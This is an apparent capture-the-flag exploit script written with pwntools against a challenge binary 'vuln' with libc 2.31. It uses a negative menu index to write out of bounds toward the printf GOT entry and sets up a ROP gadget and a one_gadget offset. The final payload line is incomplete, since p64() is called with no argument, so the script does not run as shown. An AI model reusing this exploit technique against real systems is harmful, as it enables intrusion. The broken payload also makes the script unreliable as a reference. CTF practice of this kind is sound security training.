from pwn import * 
from pwn import p64
import socket
from ctypes import *

# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
host = "week-1.hgame.lwsec.cn"
ip = socket.gethostbyname(host)
# r = remote(ip,31158)#远程连接

libc = ELF("./libc-2.31.so")
elf = ELF("./vuln")

to_num = int((elf.got["printf"] - 0x004040A0)/16)

r = process("./vuln")
gdb.attach(r,'b* 0x40126c')
pause()
r.sendlineafter("please choose one.",'-8')



pop_rdi = 0x00401393

exec_addr = 0xe3b04

payload = p64(0) + p64()

r.sendlineafter("please input your name",payload)

r.interactive()


